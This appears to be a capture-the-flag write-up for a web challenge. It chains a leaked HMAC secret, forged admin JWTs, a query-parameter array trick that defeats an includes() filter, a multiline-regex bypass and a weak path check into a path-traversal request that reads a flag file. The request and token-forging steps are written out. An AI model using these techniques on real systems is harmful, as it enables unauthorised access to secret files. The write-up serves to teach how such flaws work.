<img width="422" height="522" alt="Screenshot 2026-07-12 075310" src="https://github.com/user-attachments/assets/707fc760-3f73-4358-90e9-e0a7d5d7ac7a" />

<h3>Step 1: Become Admin</h3>

<p>
The endpoint <code>/api/docs</code> requires an admin role, but the application only issues tokens with the role <code>'user'</code>. By inspecting the page source, we can find the HMAC secret leaked in a base64-encoded string within a script tag:
</p>

<pre>
&lt;script dangerouslySetInnerHTML={{ __html: window.__ENV__={"v":"1.0.0","debug":true,"_k":"${process.env.NEXT_PUBLIC_API_SECRET_B64}"} }} /&gt;
</pre>

<p>
Base64-decoding the <code>_k</code> value reveals the secret: <code>sup3r_s3cr3t_d0cv4ult_k3y</code>. We can use this secret to forge our own JWT:
</p>

<pre>
payload = base64url({"sub":"a","role":"admin","iat":1})
sig     = HMAC-SHA256(payload, secret).hex()
token   = payload + "." + sig
</pre>

<p>This token can now be passed in the <code>Authorization: Bearer &lt;token&gt;</code> header.</p>

<h3>Step 2: Abuse File as an Array</h3>

<p>
The server attempts to prevent path traversal with the following filter:
</p>

<pre>
if (file.includes('..') || file.includes('/') || file.includes('\x00')) {
  return res.status(400).json({ error: 'Invalid characters in file path' });
}
</pre>

<p>
In JavaScript, calling <code>.includes()</code> on a string checks for a substring, but on an array, it checks for an <em>exact element match</em>. By repeating the query parameter in the URL (<code>?file=a&file=b</code>), Express parses <code>file</code> as an array (<code>['a', 'b']</code>). Therefore, passing an array element that merely <em>contains</em> <code>..</code> will bypass this check entirely.
</p>

<h3>Step 3: Beat the Segment Regex</h3>

<p>
After the <code>includes</code> check, the application validates the path segments using a regex:
</p>

<pre>
const SEGMENT_REGEX = /^[a-zA-Z0-9._\-]+$/im;
function validateSegments(filePath) {
  return filePath.split('/').every(seg => seg === '' || SEGMENT_REGEX.test(seg));
}
</pre>

<p>
When the array is passed to <code>split()</code>, JavaScript implicitly calls <code>.toString()</code>, converting <code>['a', 'b']</code> into <code>"a,b"</code>. Normally, the comma would fail the regex. However, the regex uses the <code>/m</code> (multiline) flag. By injecting a URL-encoded newline (<code>%0A</code>) into the first element, we can force the comma onto a line that satisfies the multiline boundary checks:
</p>

<pre>
['a\nb', '/../../secrets/flag.txt'].toString()
// Result: "a\nb,/../../secrets/flag.txt"
</pre>

<h3>Step 4: Weak Path Jail</h3>

<p>
Finally, the application checks if the resolved path escapes the working directory:
</p>

<pre>
const filepath = path.join(docsBase, file.toString());
if (!filepath.startsWith(process.cwd())) {
  return res.status(403).json({ error: 'Path escape detected' });
}
</pre>

<p>
Because it only checks if the path starts with <code>process.cwd()</code> (e.g., <code>/app</code>) and not the intended <code>/app/docs</code> directory, we can use our injected traversal payload to jump up a directory and into <code>secrets</code> without triggering the error. 
</p>

<h3>Step 5: Full Exploit</h3>

<p>
Combining all the steps, we send the forged admin token along with the array bypass payload:
</p>

<pre>
GET /api/docs?file=a%0Ab&file=/../../secrets/flag.txt
Authorization: Bearer &lt;forged-admin-token&gt;
</pre>

<h3>Recovered Flag</h3>

<pre>OPUCC{arr4y_byp4ss_p4th_tr4v}</pre>
